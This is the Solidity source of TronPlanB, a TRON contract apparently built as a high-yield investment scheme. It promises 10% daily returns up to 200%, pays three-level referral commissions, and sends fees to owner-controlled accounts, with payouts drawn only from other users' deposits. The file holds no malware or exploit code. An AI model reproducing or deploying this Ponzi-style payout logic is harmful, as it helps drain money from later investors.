//SourceUnit: TronPlanB.sol

/*
 *
 *   Contract name and description
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://TronPlanB.io                                       │
 *   │   Email  : contact@tronplanb.io                                       │
 *   └───────────────────────────────────────────────────────────────────────┘
 *      Develop & Audit by HazeCrypto Company (https://hazecrypto.net)
 *      S&S8712943
 *
 */

pragma solidity 0.5.10;

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}

contract TronPlanB is Ownable {
    using SafeMath for uint256;
    uint256 public constant DEVELOPER_RATE = 40;
    uint256 public constant MARKETING_RATE = 40;
    uint256 public constant REFERENCE_RATE = 150;
    uint256 public constant REFERENCE_LEVEL1_RATE = 100;
    uint256 public constant REFERENCE_LEVEL2_RATE = 30;
    uint256 public constant REFERENCE_LEVEL3_RATE = 20;
    uint256 public constant MINIMUM_DEPOSIT = 200e6; 
    uint256 public constant MAXIMUM_DEPOSIT = 500e9; 
    uint256 public constant MINIMUM_WITHDRAW = 50e6; 
    uint256 public constant REFERRER_CODE = 1000;
    uint256 public constant PLAN_INTEREST = 100;
    uint256 public constant DIRECT_BONUS_STEP = 20;
    uint256 public constant DIRECT_BONUS_MAX = 100;
    uint256 public constant INSURANCE_RATE = 50;
    uint256 public constant ROI = 2000;
    uint256 public constant DIVIDER = 1000;
    uint256 public constant TIME_STEP = 1 days;


    bool    public  insStatus;
    uint256 public  insurance;
    uint256 public  latestReferrerCode;
    uint256 public  totalInvestments;
    uint256 public  totalReinvestments;

    struct Investment {
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 withdrawn;
    }

    struct Investor {
        address addr;
		uint256 checkpoint;
        uint256 referrerEarnings;
        uint256 lastDeposit;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256 level1RefCount;
        uint256 level2RefCount;
        uint256 level3RefCount;
        uint256 totalDeposit;
        uint256 totalWithdraw;
        uint256 totalReinvest;
    }


    address payable private developer1Account;
    address payable private marketing1Account;
    address payable private developer2Account;
    address payable private marketing2Account;

    mapping(address => uint256) internal address2UID;
    mapping(uint256 => Investor) internal uid2Investor;

    event onInvest(address investor, uint256 amount);
    event onReinvest(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    constructor() public {
        developer1Account = msg.sender;
        marketing1Account = msg.sender;
        developer2Account = msg.sender;
        marketing2Account = msg.sender;
        _init();
    }

    function _init() private {
        insStatus = false;
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
    }

    function setMarketing1Account(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketing1Account = _newMarketingAccount;
    }

    function getMarketing1Account() public view onlyOwner returns (address) {
        return marketing1Account;
    }

    function setDeveloper1Account(address payable _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developer1Account = _newDeveloperAccount;
    }

    function getDeveloper1Account() public view onlyOwner returns (address) {
        return developer1Account;
    }

    function setMarketing2Account(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketing2Account = _newMarketingAccount;
    }

    function getMarketing2Account() public view onlyOwner returns (address) {
        return marketing2Account;
    }

    function setDeveloper2Account(address payable _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developer2Account = _newDeveloperAccount;
    }

    function getDeveloper2Account() public view onlyOwner returns (address) {
        return developer2Account;
    }

    function activateInsurance() public onlyOwner {
        uint256 balance = getBalance();
        require(balance <= insurance.mul(2),"contract balance should be less than twise of insurance balance");
        require(insStatus == false);
        insStatus = true;
    }

    function deactivateInsurance() public onlyOwner {
        require(insStatus == true);
        insStatus = false;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getInvestorDividends(uint256 _uid) public view returns (uint256) {
        Investor storage investor = uid2Investor[_uid];
        uint256 newDividends = 0;
        uint256 interest = getInterestRate(_uid);
        for (uint256 i = 0; i < investor.planCount; i++) {
            if(investor.plans[i].withdrawn < investor.plans[i].investment.mul(ROI).div(DIVIDER)){
                uint256 withdrawalDate = block.timestamp;
                uint256 amount = _calculateDividends(investor.plans[i].investment , interest , withdrawalDate , investor.plans[i].lastWithdrawalDate);
                if(investor.plans[i].withdrawn.add(amount) >  investor.plans[i].investment.mul(ROI).div(DIVIDER)){
                    amount = (investor.plans[i].investment.mul(ROI).div(DIVIDER)).sub(investor.plans[i].withdrawn);
                }
                newDividends += amount;
            }
        }
        return newDividends ;
    }
    
    function getInvestorTotalStats(uint256 _uid) public view returns (uint256,uint256,uint256) {
        Investor storage investor = uid2Investor[_uid];
        return (
            investor.totalDeposit,
            investor.totalWithdraw,
            investor.totalReinvest) ;
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256,uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        Investor storage investor = uid2Investor[_uid];
        return
        (
        investor.referrerEarnings,
        investor.lastDeposit,
        investor.referrer,
        investor.level1RefCount,
        investor.level2RefCount,
        investor.level3RefCount,
        investor.planCount,
        investor.checkpoint
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory) {
        Investor storage investor = uid2Investor[_uid];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory withdrawn = new  uint256[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            withdrawn[i] = investor.plans[i].withdrawn;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
        }

        return
        (
        investmentDates,
        investments,
        withdrawn
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uid2Investor[_ref1].level1RefCount = uid2Investor[_ref1].level1RefCount.add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].level2RefCount = uid2Investor[_ref2].level2RefCount.add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].level3RefCount = uid2Investor[_ref3].level3RefCount.add(1);
            }
        }
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        require(insStatus == false, "insurance system activated");
        require(_amount >= MINIMUM_DEPOSIT, "Less than the minimum amount of deposit requirement");
        require(_amount <= MAXIMUM_DEPOSIT, "greater than the maximum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {
          //old user
          //do nothing, referrer is permenant
        }
        uint256 planCount = uid2Investor[uid].planCount;
        Investor storage investor = uid2Investor[uid];
        require( _amount >  investor.lastDeposit , " new deposit should be greater than previous deposit " );


        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].withdrawn = 0;

        investor.planCount = investor.planCount.add(1);
        investor.checkpoint = block.timestamp;

        _calculateReferrerReward(_amount, investor.referrer);

        investor.totalDeposit = investor.totalDeposit.add(_amount); 
        totalInvestments = totalInvestments.add(_amount);
        insurance = insurance.add(_amount.mul(INSURANCE_RATE).div(DIVIDER));

        uint256 developerPercentage = (_amount.mul(DEVELOPER_RATE)).div(DIVIDER);
        developer1Account.transfer(developerPercentage);
        uint256 marketingPercentage = (_amount.mul(MARKETING_RATE)).div(DIVIDER);
        marketing1Account.transfer(marketingPercentage);
        return true;
    }

    function _reinvest(address _addr, uint256 _amount) private returns (bool) {
        require(insStatus == false, "insurance system activated");
        require(_amount >= MINIMUM_DEPOSIT, "Less than the minimum amount of reinvest requirement");
        require(_amount <= MAXIMUM_DEPOSIT, "greater than the maximum amount of deposit requirement");
        uint256 uid = address2UID[_addr];

        uint256 planCount = uid2Investor[uid].planCount;
        Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].withdrawn = 0;

        investor.planCount = investor.planCount.add(1);
        investor.totalReinvest = investor.totalReinvest.add(_amount);
        totalReinvestments = totalReinvestments.add(_amount);
        return true;
    }

    function invest(uint256 _referrerCode) public payable {
        if (_invest(msg.sender, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function incInsurance() public payable {
        require(msg.value > 0, "zero");
        insurance = insurance.add(msg.value);
    }

    function withdraw() public {

        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");
        Investor storage investor = uid2Investor[uid];
		require(block.timestamp > investor.checkpoint + 1 days , "Only once a day");
        uint256 withdrawalAmount = 0;
        if(insStatus==false){
            uint256 dividends = getInvestorDividends(uid);
            require(dividends > MINIMUM_WITHDRAW , "min withdraw is 50 TRX");

            investor.checkpoint = block.timestamp;

            
            uint256 interest = getInterestRate(uid);
            for (uint256 i = 0; i < investor.planCount; i++) {
                if(investor.plans[i].withdrawn < investor.plans[i].investment.mul(ROI).div(DIVIDER)){
                    uint256 withdrawalDate = block.timestamp;
                    uint256 amount = _calculateDividends(investor.plans[i].investment , interest , withdrawalDate , investor.plans[i].lastWithdrawalDate);
                    if(investor.plans[i].withdrawn.add(amount) >  investor.plans[i].investment.mul(ROI).div(DIVIDER)){
                        amount = (investor.plans[i].investment.mul(ROI).div(DIVIDER)).sub(investor.plans[i].withdrawn);
                    }
                    withdrawalAmount += amount;
                    investor.plans[i].lastWithdrawalDate = withdrawalDate;
                    investor.plans[i].withdrawn += amount;
                }
            }

            if(withdrawalAmount>0){
                uint256 currentBalance = getBalance();
                currentBalance = currentBalance.subz(insurance);
                if(withdrawalAmount >= currentBalance){
                    withdrawalAmount=currentBalance;
                }
                msg.sender.transfer(withdrawalAmount);

                investor.totalWithdraw = investor.totalWithdraw.add(withdrawalAmount);

                if(currentBalance.subz(withdrawalAmount)>0){
                    uint256 developerPercentage = (withdrawalAmount.mul(DEVELOPER_RATE)).div(DIVIDER);
                    developer2Account.transfer(developerPercentage);
                    uint256 marketingPercentage = (withdrawalAmount.mul(MARKETING_RATE)).div(DIVIDER);
                    marketing2Account.transfer(marketingPercentage);
                }
            }
        }
        else{
            require(investor.totalWithdraw < investor.totalDeposit,"only users which withdraw less than capital amount can withdraw");

            investor.checkpoint = block.timestamp;
            uint256 interest = getInterestRate(uid);
            for (uint256 i = 0; i < investor.planCount; i++) {
                if(investor.plans[i].withdrawn < investor.plans[i].investment){
                    uint256 withdrawalDate = block.timestamp;
                    uint256 amount = _calculateDividends(investor.plans[i].investment , interest , withdrawalDate , investor.plans[i].lastWithdrawalDate);
                    if(investor.plans[i].withdrawn.add(amount) >  investor.plans[i].investment){
                        amount = (investor.plans[i].investment).sub(investor.plans[i].withdrawn);
                    }
                    withdrawalAmount += amount;
                    investor.plans[i].lastWithdrawalDate = withdrawalDate;
                    investor.plans[i].withdrawn += amount;
                }
            }

            if(withdrawalAmount>0){
                uint256 currentBalance = getBalance();
                if(withdrawalAmount >= currentBalance){
                    withdrawalAmount=currentBalance;
                }
                msg.sender.transfer(withdrawalAmount);

                investor.totalWithdraw = investor.totalWithdraw.add(withdrawalAmount);
                if(currentBalance.subz(withdrawalAmount)>0){
                    uint256 developerPercentage = (withdrawalAmount.mul(DEVELOPER_RATE)).div(DIVIDER);
                    developer2Account.transfer(developerPercentage);
                    uint256 marketingPercentage = (withdrawalAmount.mul(MARKETING_RATE)).div(DIVIDER);
                    marketing2Account.transfer(marketingPercentage);
                }
            }
        }

        emit onWithdraw(msg.sender, withdrawalAmount);
    }

    function reinvest() public {

        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not reinvest because no any investments");
        Investor storage investor = uid2Investor[uid];
        uint256 withdrawalAmount = 0;
        uint256 interest = getInterestRate(uid);
        for (uint256 i = 0; i < investor.planCount; i++) {
            if(investor.plans[i].withdrawn < investor.plans[i].investment.mul(ROI).div(DIVIDER)){
                uint256 withdrawalDate = block.timestamp;
                uint256 amount = _calculateDividends(investor.plans[i].investment , interest , withdrawalDate , investor.plans[i].lastWithdrawalDate);
                if(investor.plans[i].withdrawn.add(amount) >  investor.plans[i].investment.mul(ROI).div(DIVIDER)){
                    amount = (investor.plans[i].investment.mul(ROI).div(DIVIDER)).sub(investor.plans[i].withdrawn);
                }
                withdrawalAmount += amount;
                investor.plans[i].lastWithdrawalDate = withdrawalDate;
                investor.plans[i].withdrawn += amount;
            }
        }

        if(withdrawalAmount>0){
            _reinvest(msg.sender,withdrawalAmount);
        }

        emit onReinvest(msg.sender, withdrawalAmount);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / DIVIDER * (_now - _start)) / TIME_STEP;
    }

    function getInterestRate(uint256 uid) public view returns(uint256){
        uint256 interest = 0;
        if(insStatus){
            interest = INSURANCE_RATE;
        }
        else{
            interest = uid2Investor[uid].level1RefCount * DIRECT_BONUS_STEP;
            if(interest > DIRECT_BONUS_MAX){
                interest = DIRECT_BONUS_MAX;
            }

            interest += PLAN_INTEREST;
        }

        return interest;
    }

    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {

        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _refAmount = 0;

            if (_ref1 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(DIVIDER);
                address(uint160(uid2Investor[_ref1].addr)).transfer(_refAmount);
                uid2Investor[_ref1].referrerEarnings = uid2Investor[_ref1].referrerEarnings.add(_refAmount);
            }

            if (_ref2 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(DIVIDER);
                address(uint160(uid2Investor[_ref2].addr)).transfer(_refAmount);
                uid2Investor[_ref2].referrerEarnings = uid2Investor[_ref2].referrerEarnings.add(_refAmount);
            }

            if (_ref3 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(DIVIDER);
                address(uint160(uid2Investor[_ref3].addr)).transfer(_refAmount);
                uid2Investor[_ref3].referrerEarnings = uid2Investor[_ref3].referrerEarnings.add(_refAmount);
            }
        }

    }

}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function subz(uint256 a, uint256 b) internal pure returns (uint256) {
        if(b >= a){
            return 0;
        }
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }
}